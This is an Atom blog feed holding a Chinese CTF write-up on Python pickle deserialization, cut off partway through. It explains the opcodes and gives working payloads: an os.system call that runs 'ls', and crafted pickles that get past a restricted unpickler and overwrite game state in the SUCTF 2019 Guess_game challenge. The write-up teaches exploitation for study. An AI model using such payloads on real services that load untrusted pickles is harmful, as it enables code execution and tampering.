<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2019-11-04T02:27:17.021Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python pickle 反序列化实例分析</title>
    <link href="https://wywwzjj.top/2019/10/24/Python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/</id>
    <published>2019-10-24T02:26:07.000Z</published>
    <updated>2019-11-04T02:27:17.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些师傅。下文记录了我的学习笔记以及踩过的坑，希望对大家理解 pickle 有点帮助。</p><p>这个 PPT 一定要好好看看，非常的通俗易懂。<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><blockquote><p>Python 提供了两个库，pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写）</p><p>用 pycharm 调试的话需要更改一下代码，pyckle.py 的第 1607 行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment"># Use the faster _pickle if possible</span></span><br><span class="line">&gt; <span class="keyword">try</span>:</span><br><span class="line">&gt;     <span class="keyword">from</span> _pickle <span class="keyword">import</span> ( ...  <span class="comment"># 这里 _pickle =&gt; pickle</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><ul><li>从对象中提取所有属性（<code>__dict__</code>），并将属性转为键值对</li><li>写入对象的类名</li><li>写入键值对</li></ul><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><ul><li>获取 pickle 输入流</li><li>重建属性列表</li><li>根据保存的类名创建一个新的对象</li><li>将属性复制到新的对象中</li></ul><h2 id="pickle-是什么？"><a href="#pickle-是什么？" class="headerlink" title="pickle 是什么？"></a>pickle 是什么？</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p><p>PVM 由三部分组成：</p><ul><li><p><strong>指令处理器</strong></p><p>  从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止。</p><p>  最终留在栈顶的值将被作为反序列化对象返回。</p></li><li><p><strong>stack</strong></p><p>  由 Python 的 <strong>list</strong> 实现，被用来临时存储数据、参数以及对象。</p></li><li><p><strong>memo</strong></p><p>  由 Python 的 <strong>dict</strong> 实现，为 PVM 的整个生命周期提供存储。</p></li></ul><p><strong>PS</strong>：注意下 stack、memo 的实现方式，方便理解下面的指令。</p><blockquote><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><ul><li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class" target="_blank" rel="noopener">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307" target="_blank" rel="noopener"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes" target="_blank" rel="noopener"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154" target="_blank" rel="noopener"><strong>PEP 3154</strong></a>。</li></ul></blockquote><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><blockquote><p>本文重点说明 0 号协议，不明白的指令建议直接看对应实现！</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><h2 id="如何生成-pickle？"><a href="#如何生成-pickle？" class="headerlink" title="如何生成 pickle？"></a>如何生成 pickle？</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>基本模式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">callable</span>&gt;</span></span><br><span class="line">(<span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>看个小例子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'ls'</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__('os').system(*('ls',))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解一下：</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  引入 system，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S'ls'=&gt;  把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack</span><br><span class="line">t=&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"><span class="comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, ('ls',)]</span></span><br><span class="line">R =&gt;  system(*('ls',))</span><br><span class="line">.=&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">    </span><br><span class="line">print(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>缺点：只能执行单一的函数，很难构造复杂的操作，下文的讲解都是直接写。</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="SUCTF-2019-Guess-game"><a href="#SUCTF-2019-Guess-game" class="headerlink" title="SUCTF 2019 Guess_game"></a>SUCTF 2019 Guess_game</h3><blockquote><p>完整源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p></blockquote><p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ticket</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number)</span>:</span></span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> type(self) == type(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> type(self.number) == int</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = input(<span class="string">'Input the number you guess\n&gt; '</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(len(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure><p>client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py 有删减</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        print(<span class="string">'The number is invalid.'</span>)</span><br><span class="line">        game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = <span class="string">"Congratulations, you get the right number!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Wrong number, better luck next time."</span></span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">"Game over! You win all the rounds, here is your flag %s"</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Game over! You got %d/%d."</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>server 端将接收到的数据进行反序列，这里与常规的 <code>pickle.loads</code> 不同，采用的是 Python 提供的<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals" target="_blank" rel="noopener">安全措施</a>。也就是说，导入的模块只能以 <code>guess_name</code> 开头，并且名称里不能含有 <code>__</code>。</p><p>最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span><span class="params">(self, ticket)</span>:</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>只要能控制住 <code>curr_ticket</code>，每局就能稳赢，或者直接将 <code>win_count</code> 设为 10，能实现吗？</p><p><strong>先试试覆盖 <code>win_count</code> 和 <code>round_count</code></strong>。换句话来说，就是需要在反序列化 Ticket 对象前执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game  <span class="comment"># __init__.py  game = Game()</span></span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BUILD = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="comment"># 具体实现在 pickle.py 的 1546 行</span></span><br></pre></td></tr></table></figure><p>开始构造</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S'round_count'</span><br><span class="line">I10</span><br><span class="line">sS'win_count'</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure><p>其中，<code>}</code> 是往 stack 中压入一个空 dict，<code>s</code> 是将键值对插入到 dict。</p><p>测试一下效果，成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7yxg3sbn9j20pj062wew.jpg" alt="image.png"></p><p>到这就做完了吗？不，还有个小验证，<code>assert type(ticket) == Ticket</code>。</p><p>之前提到过，<code>pickle</code> 序列流执行完后将把栈顶的值返回，那结尾再留一个 <code>Ticket</code> 的对象就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ticket = Ticket(<span class="number">6</span>)</span><br><span class="line">res = pickle.dumps(ticket)  <span class="comment"># 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>最终 payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S"win_count"<span class="symbol">\n</span>I10<span class="symbol">\n</span>sS"round_count"<span class="symbol">\n</span>I9<span class="symbol">\n</span>sbcguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sb.</span><br></pre></td></tr></table></figure><p><strong>尝试覆盖掉 <code>current_ticket</code></strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span></span><br><span class="line">game</span><br><span class="line">&#125;S'curr_ticket'</span><br><span class="line">cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。</p><p>最终 payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S'curr_ticket'<span class="symbol">\n</span>cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>07sbp0<span class="symbol">\n</span>sbg0<span class="symbol">\n</span>.</span><br></pre></td></tr></table></figure><h3 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h3><blockquote><p>完整源码： <a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 